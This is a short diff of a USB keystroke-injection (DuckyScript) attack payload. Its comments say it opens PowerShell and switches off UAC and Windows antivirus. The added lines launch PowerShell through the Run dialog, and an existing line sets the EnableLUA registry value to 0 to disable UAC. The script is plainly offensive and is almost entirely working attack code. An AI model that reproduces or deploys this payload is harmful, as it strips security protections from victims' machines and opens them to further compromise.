@@ -1,6 +1,10 @@
 REM made by YHUSS-SEC
 REM (will attempt to create a powershell session and deactivate UAC and windows AV)
 
+GUI r
+DELAY 400
+STRING powershell
+ENTER
 DELAY 400
 STRING Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0
 ENTER
